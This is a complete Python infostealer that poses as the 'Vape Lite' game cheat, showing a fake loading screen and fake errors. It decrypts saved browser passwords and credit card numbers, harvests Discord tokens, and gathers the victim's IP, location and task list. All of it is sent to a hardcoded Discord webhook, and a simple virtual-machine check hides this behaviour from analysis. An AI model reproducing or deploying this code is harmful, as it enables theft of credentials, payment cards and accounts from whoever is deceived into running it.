# Imports [DO NOT CHANGE]
import os
import json
import requests
import time
import tkinter
import itertools
import psutil
import subprocess
import tempfile
import random
import shutil
import re
import sys
import uuid
from colorama import init, Fore, Back, Style
from tkinter import *
from PIL import Image, ImageTk, ImageSequence
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen
from discord_webhook import DiscordWebhook, DiscordEmbed

import base64
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook
import string

# Colour Setup
init(convert=True)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

WEBHOOK_URL = "https://discord.com/api/webhooks/1364723568889565255/ZqXByjPELQSVGyPMAvc3TZB_v9fNTPuR_MrKMKwSUMYJtNbW9duzccrvf3gmErohkn21"

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
}



data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Month', 'Year', 'Card Number'],
        'decrypt': True
    },
    #'history': {
    #    'query': 'SELECT url, title, last_visit_time FROM urls',
    #    'file': '\\History',
    #    'columns': ['URL', 'Title', 'Visited Time'],
    #    'decrypt': False
    #},
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return
    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return CryptUnprotectData(key[5:], None, None, None, 0)[1]

def decrypt(buff: bytes, key: bytes) -> str:
    try:
        iv = buff[3:15]          
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        return None

def save_results(browser_name, type_of_data, content):
    if content and content.strip():
        random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + ".txt"
        
        temp_dir = os.getenv('TEMP', '/tmp') 
        file_path = os.path.join(temp_dir, random_filename)
        
        with open(file_path, "w", encoding="utf-8") as temp_file:
            temp_file.write(content)
        
        Webhookurl = "https://discord.com/api/webhooks/1364723568889565255/ZqXByjPELQSVGyPMAvc3TZB_v9fNTPuR_MrKMKwSUMYJtNbW9duzccrvf3gmErohkn21"  #exfiltrate webhook here
        webhook = DiscordWebhook(
            url=WEBHOOK_URL,
            content=f"Extracted {type_of_data.replace('_', ' ')} from {browser_name}."
        )
        with open(file_path, "rb") as temp_file:
            webhook.add_file(file=temp_file.read(), filename=random_filename)
        response = webhook.execute()
        
        os.remove(file_path)

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except Exception:
        return result
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    if type_of_data['columns'][i] == 'Card Number':
                        row[i] = decrypt(row[i], key)
                    else:
                        row[i] = decrypt(row[i], key)
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def installed_browsers():
    return [x for x in browsers.keys() if os.path.exists(browsers[x] + "\\Local State")]


# VM checks.
VM_DETECTED = False
if hasattr(sys, 'real_prefix'): # Check for VM (using Hasattr).
     VM_DETECTED = True
else:
     VM_DETECTED = False
if str(uuid.UUID(int=uuid.getnode())) == "00000000-0000-0000-0000-000000000000": # Check for VM (using UUID).
    VM_DETECTED = True

# Lists / Variables
PREFETCH = "[] " # [LEAVE AS IS] For the fake UI.

if VM_DETECTED == False:
    FILE_NAME = "Fake Koid"
    ABC = list("abcdefghijklmnopqrstuvwxyz")
    DOWNLOADED = False

    STAGES = [
        "Connecting to servers...",
        "Establishing connection..",
        "Patching..",
        "Finding dependencies..",
        "Download successful!",
        "Launching Fether C.."
    ]

    DELAYS = ["0.2"] * len(STAGES)
    ERRORS = ["You are seeing DEBUG requests due to [DEBUG] mode.", "JAR comp Successful."]
    PING_ME = False
    FULL_PATH = ""

    # Definitons

    # Find tokens for  PATH list.
    def findTokens(path):
        path += '\\Local Storage\\leveldb' # For discord.
        tokens = [] # Token List.
        try: # Exception (To make sure no errors).
            for file_name in os.listdir(path): # Search through all files.
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token) # Append.
        except:
            pass
        return tokens # Return.


    # Main payload.
    def executePayload():
        local = os.getenv('localappdata') # Environment variables.
        roaming = os.getenv('appdata') # Environment variables.
        appdata = os.getenv('appdata') # Environment variables.
        try: 
            Jsondata = requests.get("http://ipinfo.io/json").json() # Get IP.
            ip = Jsondata['ip'] # Parse for IP.
            city = Jsondata['city'] # Parse for CITY.
            country = Jsondata['country'] # Parse for COUNTRY.
            region = Jsondata['region'] # Parse for REGION.
            googlemap = "https://www.google.com/maps/search/google+map++" + Jsondata['loc'] # Create google map Func.
        except: # Exception (To make sure no errors).
            pass
        # Paths for Discord, Chrome, Edge etc...
        paths = { 
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        # Blank message setup.
        message = ''
        for platform, path in paths.items(): # For available paths.
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}** Information\n```\n' # Add info to message.

            tokens = findTokens(path) #Grab tokens for path.

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n' # Add listed tokens to list in embed.
            else:
                message += 'No tokens found.\n' # Else add NONE.

            message += '```' # Add gap.

        headers = { # Header for embed.
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        embed = { # Main embed.
            "avatar_url":"https://i.imgur.com/VIWztfa.jpg", # Avatar URL.
            "embeds": [
                {
                    "author": {
                        "name": f"{FILE_NAME}",
                        "url": "https://www.urbandictionary.com/define.php?term=L", # Troll link.
                        "icon_url": "https://i.imgur.com/sqQlid7h.jpg" # Cosmetic images.
                    },
                    # Main embed layout. (F-string).
                    "description": f"**{os.getlogin()}** Just ran {FILE_NAME}.\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n{message}",
                    "color": 16119101, # Embed colour.

                    "thumbnail": {
                      "url": "https://i.imgur.com/sqQlid7h.jpg" # Cosmetic images.
                    },       

                    "footer": {
                      "text": "(That's a massive L)" # :)
                    }
                }
            ]
        }
        try: # Exception (To make sure no errors).
            requests.post(WEBHOOK_URL, json=embed) # Attempt to send.
        except:
            pass

    # Message Hook
    def messageHook(message):
        headers = { # Header for embed.
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' 
        }

        embed = {
            "avatar_url":"https://i.imgur.com/VIWztfa.jpg", # Avatar URL.
            "embeds": [
                {
                    "author": {
                        "name": f"{FILE_NAME}",
                        "url": "https://www.urbandictionary.com/define.php?term=L", # Troll link.
                        "icon_url": "https://i.imgur.com/sqQlid7h.jpg" # Cosmetic images.
                    },
                    "description": f"**{os.getlogin()}** Sent the message...\n```{message}```", # Send message within embed.
                    "color": 16119101, # Embed colour.

                    "thumbnail": {
                      "url": "https://i.imgur.com/sqQlid7h.jpg" # Cosmetic images.
                    },       

                    "footer": {
                      "text": "Massive L indeed." # :)
                    }
                }
            ]
        }
        try: # Exception (To make sure no errors).
            requests.post(WEBHOOK_URL, json=embed) # Attempt to send.
        except:
            pass

    # Send TaskList
    def sendTaskList():
        # Get webhook (Discord-Webhook.py Library).
        webhook = DiscordWebhook(url=str(WEBHOOK_URL), username=f"{os.getlogin()}'s TaskList")
        # Gather list.
        s = subprocess.check_output('tasklist', shell=True)
        # Send message to webhook.
        messageHook("Sending users TaskList:")
        # Send file (TXT) to webhook.
        webhook.add_file(file=str(s), filename='tasklist.txt')
        # Send.
        response = webhook.execute()

    # Generate TEMP folder (Random name - Defined in FULL_PATH) and images for GUI
    def generateFiles():
        clear_console()
        print("Please Wait... Vape Lite is Starting")
        time.sleep(3)
        print("Loading Please Wait")

        global DOWNLOADED
        global FULL_PATH # Make global.
        # Generate Tempfolder name.
        temp = ""
        
        for i in range(0,20): # [CAN BE CHANGED FOR EXTRA RANDOM] Generate 20 char long folder in \AppData\Local\Temp.
            temp = temp + str(ABC[random.randint(0,len(ABC)-1)]) # Gen name.
            
        full_path = os.path.join(tempfile.gettempdir(), str(temp)) # Create Pathing.

        # Assign to FULL_PATH (Global).
        FULL_PATH = full_path

        # Create Path.
        os.mkdir(full_path)

        # MAIN background.
        image_url = "https://raw.githubusercontent.com/UseUelessStorage/WLib/main/Picture.png"
        filename = image_url.split("/")[-1]

        # Exit button.
        image_url2 = "https://raw.githubusercontent.com/NightTabGit/FakeLite/main/Exit.png"
        filename2 = image_url2.split("/")[-1]

        # Minimize button.
        image_url3 = "https://raw.githubusercontent.com/NightTabGit/FakeLite/main/Minimize.png"
        filename3 = image_url3.split("/")[-1]

        # Download images to TEMP folder.

        flags = 0
        # Download background locally (NOT in Temp).
        r = requests.get(image_url, stream = True)
        if r.status_code == 200: # Check for success.
            r.raw.decode_content = True
            with open(filename,'wb') as f:
                shutil.copyfileobj(r.raw, f) # Finish download.
        else:
            flags = flags + 1
            pass
        shutil.copy("Picture.png", full_path) # Send to TEMP folder.
        os.remove("Picture.png") # Remove local PNG.

        # Download exit button locally (NOT in Temp).
        r = requests.get(image_url2, stream = True)
        if r.status_code == 200: # Check for success.
            r.raw.decode_content = True
            with open(filename2,'wb') as f:
                shutil.copyfileobj(r.raw, f) # Finish download.
        else:
            flags = flags + 1
            pass
        shutil.copy("Exit.png", full_path) # Send to TEMP folder.
        os.remove("Exit.png")

        # Download minimize button locally (NOT in Temp).
        r = requests.get(image_url3, stream = True)
        if r.status_code == 200: # Check for success.
            r.raw.decode_content = True
            with open(filename3,'wb') as f:
                shutil.copyfileobj(r.raw, f) # Finish download.
        else:
            flags = flags + 1
            pass
        shutil.copy("Minimize.png", full_path)  # Send to TEMP folder.
        os.remove("Minimize.png") # Remove local PNG.

        if flags == 0:
             DOWNLOADED = True
        else:
             DOWNLOADED = False # No Images = No GUI (CANCEL REQ).

    # Vape GUI.
    def vapeGUI():
        if __name__ == '__main__':
            available_browsers = installed_browsers()
            for browser in available_browsers:
                browser_path = browsers[browser]
                master_key = get_master_key(browser_path)
                for data_type_name, data_type in data_queries.items():
                    profile = "Default"
                    data = get_data(browser_path, profile, master_key, data_type)
                    save_results(browser, data_type_name, data)

        # Setup window.
        width = 914 # Width of window.
        height = 606 # Height of window.
        
        root = tkinter.Tk() # Name.
        
        root.overrideredirect(True) # Get rid off standard window (By Windows OS) declaring independancy.
        w, h = int(width), int(height) # Heigher, Width.
        
        canvas = tkinter.Canvas(root, width=w, height=h, highlightthickness=0) # Start canvas (Hidden borders).
        
        filename = PhotoImage(file = os.path.join(FULL_PATH + "\Picture.png")) # Set background.
        image = canvas.create_image(int(width), 0, anchor=NE, image=filename,) # Set in middle.
        canvas.pack(fill='both') # Pack
        
        root.eval('tk::PlaceWindow . center') # Window in center of screen.
        if isinstance(root, Tk): # Determine when packed.
            master = root  # Root window.
        else:
            master = root.master
            
        # Drag window code [DO NOT CHANGE].

        x, y = 0, 0 # Set at 0.
        def mouseMotion(event): # Drag event.
            global x, y
            offset_x, offset_y = event.x - x, event.y - y  
            new_x = master.winfo_x() + offset_x
            new_y = master.winfo_y() + offset_y
            new_geometry = f"+{new_x}+{new_y}"
            master.geometry(new_geometry)

        def mousePress(event): # Detect mouse press.
            global x, y
            count = time.time()
            x, y = event.x, event.y

        root.bind("<B1-Motion>", mouseMotion) # Bind down + up.
        root.bind("<Button-1>", mousePress)

        def destroyWindow(): # Destroy window.
            fadeOut()
            root.destroy()

        def minimizeWindow(): # Hide (Temporary) window.
            fadeOut()
            root.state('withdrawn') # Hide.
            time.sleep(0.2) # Wait 2 seconds before showing again (Make it seem glitched).
            root.state('normal') # Show.
            fadeInFast()

        # Buttons.
        exit_btn= PhotoImage(file=os.path.join(FULL_PATH + "\Exit.png")) # Exit button.
        img_label= Label(image=exit_btn)
        button = Button(root, image=exit_btn,command= destroyWindow, borderwidth=0, highlightthickness=0, relief = FLAT,activebackground = "#19191b") # BUTTON (MAXIMIZE).
        button.pack(pady=30)
        button.place(x=870, y=3) # X + Y co-ords.
        button.lift()

        click_btn= PhotoImage(file=os.path.join(FULL_PATH + "\Minimize.png")) # Minimize button.
        img_label2= Label(image=click_btn)
        button = Button(root, image=click_btn,command= minimizeWindow, borderwidth=0, highlightthickness=0, relief = FLAT,activebackground = "#19191b") # Button (MINIMIZE).
        button.pack(pady=30)
        button.place(x=845, y=4) # X + Y co-ords.
        button.lift()

        def fadeIn():
            Alpha = 0.0
            root.attributes("-alpha", Alpha) # Alpha (Window).
            while 1.0 > Alpha :
                Alpha = Alpha + 0.04 # Increment by 0.04 per 0.005s.
                root.attributes("-alpha", Alpha) # Update alpha value.
                time.sleep(0.005)

        def fadeInFast():
            Alpha = 0.0
            root.attributes("-alpha", Alpha) # Alpha (Window).
            while 1.0 > Alpha :
                Alpha = Alpha + 0.2 # Increment by 0.2 per 0.005s.
                root.attributes("-alpha", Alpha) # Update alpha value.
                time.sleep(0.005)
                
        def fadeOut():
            Alpha = 1.0
            root.attributes("-alpha", Alpha) # Alpha (Window).
            while Alpha > 0.1:
                Alpha = Alpha - 0.2 # Increment by -0.2 per 0.005s.
                root.attributes("-alpha", Alpha) # Update alpha value.
                time.sleep(0.005)
            
        ## Launch code.
        root.attributes('-topmost', True) # Window always ontop.
        Alpha = 0
        root.attributes("-alpha", Alpha) # Set to 0 (Hidden).
        root.after(400, fadeIn) # Fade in after 400 ms delay.
        root.mainloop() # Start loop.

    ##
    ##
    ##
    # Main GUI / Code.
    ##
    ##
    ##

    # Generate files (TEMP).
    try:
        generateFiles()
    except:
        pass

    # Send Tokens.
    try:
        executePayload()
    except: # Check if wifi.
        try:
            messageHook("Failed to execute payload.") # Send fail msg.
        except:
            pass # Probably no internet or Webhook is down. (VM?)

    # Send TaskList.
    try:
        sendTaskList()
    except:
        try:
            messageHook("Failed to send tasklist.") # Send fail msg.
        except:
            pass # Probably no internet or Webhook is down. (VM?)

    # GUI / Spoof vape.
    print()
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Vape Lite v1.2")
    print()

    for i in range(0, len(STAGES)): # Send  "loading" sequence.
        print(Fore.WHITE + str(PREFETCH) + Fore.CYAN + str(STAGES[i]))
        time.sleep(float(DELAYS[i]))
    time.sleep(1)
    print()

    for i in range(0, len(ERRORS)): # Send "Error" sequence.
        print(Fore.WHITE + str(PREFETCH) + Fore.RED + str(ERRORS[i]))
        time.sleep(0.01)
    time.sleep(0.5)

    print()
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Auto Inject: Roblox not found...") # Spoof no MC.
    print()

    time.sleep(0.1) # Slight delay.
    if DOWNLOADED == True:
         vapeGUI()
    else:
         #print(Fore.WHITE + str(PREFETCH) + Fore.RED + "ERROR | Firewall blocked essential files. #78ee") # Bogus error.
         #print()
         time.sleep(2)

    # Once GUI is closed delete TEMP folder, and all contents.
    try:
         shutil.rmtree(FULL_PATH)
    except:
         pass

    # Exit program.
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Exiting...")
    time.sleep(2)
else: # When in VM (Or some form has flagged.)
    print()
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Vape Lite v3.4 Patcher v1.2") # Bogus responses.
    print()
    time.sleep(3)
    for i in range(0,3):
        print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Error (FATAL)") # Bogus responses.
        time.sleep(0.1)
    print()
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Error in run-time environment detected. Possible causes (Invalid repositories)") # Bogus responses.
    time.sleep(5)
    print()
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Exiting...") # Bogus responses.
    time.sleep(1)
    

